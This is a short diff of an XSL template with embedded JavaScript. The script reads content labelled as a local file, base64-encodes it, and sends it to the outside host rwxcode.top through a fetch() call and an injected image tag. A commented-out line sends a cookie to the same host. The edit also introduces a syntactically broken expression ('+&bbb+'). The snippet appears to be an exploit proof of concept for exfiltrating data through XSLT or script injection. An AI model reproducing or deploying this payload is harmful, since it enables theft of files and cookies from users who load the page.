@@ -31,10 +31,11 @@ local file content:&lt;textarea style="width:100%;height:6rem">${ p.innerHTML }&
       aaa = document.querySelector('#r').innerHTML;
         
       fetch('http://rwxcode.top/log?info=' + btoa(aaa));
+      bbb = btoa(aaa);
 
       //document.location = 'http://rwxcode.top/log?cookie=' + btoa(aaa);
 
-      document.write('<img src="http://rwxcode.top/123?c='+btoa(aaa)+'" />');
+      document.write('<img src="http://rwxcode.top/123?c='+&bbb+'" />');
       </script>
     </body>
   </xsl:template>
